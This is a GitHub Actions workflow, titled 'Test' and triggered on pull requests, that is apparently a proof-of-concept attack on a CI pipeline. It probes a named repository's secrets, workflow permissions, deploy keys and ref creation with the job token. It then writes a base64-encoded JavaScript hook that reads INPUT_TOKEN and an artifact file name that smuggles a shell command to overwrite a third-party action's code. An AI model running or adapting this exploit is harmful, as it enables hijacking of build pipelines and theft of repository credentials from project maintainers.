name: Test

on:
  pull_request:

permissions: write-all

jobs:
  content:
    runs-on: ubuntu-latest
    steps:
      - name: probe fork token
        env:
          T: ${ github.token }
        run: |
          R=PDFtoMark/triage-bgd-labs-v1605241-2666c4
          echo "== repo =="; curl -s -o /tmp/a -w "%{http_code}\n" -H "Authorization: Bearer $T" https://api.github.com/repos/$R; head -c 300 /tmp/a; echo
          echo "== secrets =="; curl -s -o /tmp/b -w "%{http_code}\n" -H "Authorization: Bearer $T" https://api.github.com/repos/$R/actions/secrets; head -c 200 /tmp/b; echo
          echo "== perms-workflow =="; curl -s -o /tmp/c -w "%{http_code}\n" -H "Authorization: Bearer $T" https://api.github.com/repos/$R/actions/permissions/workflow; head -c 200 /tmp/c; echo
          echo "== create-ref =="; curl -s -o /tmp/d -w "%{http_code}\n" -X POST -H "Authorization: Bearer $T" -H "Content-Type: application/json" -d '{"ref":"refs/heads/probe-fork-token","sha":"${{ github.event.pull_request.head.sha }}"}' https://api.github.com/repos/$R/git/refs; head -c 300 /tmp/d; echo
          echo "== deploy keys =="; curl -s -o /tmp/e -w "%{http_code}\n" -H "Authorization: Bearer $T" https://api.github.com/repos/$R/keys; head -c 200 /tmp/e; echo
          echo "== token len =="; echo -n "$T" | wc -c
      - name: craft artifact
        run: |
          mkdir -p /tmp/content
          echo "attacker report" > /tmp/content/r
          printf 'x\n' > /tmp/content/envfile
          python3 - <<'PY'
          import base64
          open('/tmp/content/hook.js','wb').write(base64.b64decode('dHJ5e2NvbnN0IGNwPXJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKTtjb25zdCB0PXByb2Nlc3MuZW52LklOUFVUX1RPS0VOfHwnJztjb25zb2xlLmxvZygnSE9PS19MRU49Jyt0Lmxlbmd0aCk7fWNhdGNoKGUpe2NvbnNvbGUubG9nKCdIT09LX0VSUj0nK2UubWVzc2FnZSk7fQ=='))
          open('/tmp/content/r;D=$(dirname${IFS}$(mktemp));S=${D%tmp};B=$D${S}content${S}contentdefault;cp${IFS}$B${S}hook.js${IFS}$HOME${S}work${S}_actions${S}peter-evans${S}commit-comment${S}v3${S}dist${S}index.js;true;#.txt', 'w').write('x\n')
          PY
      - name: upload artifact
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        with:
          name: contentdefault
          path: /tmp/content
          if-no-files-found: error
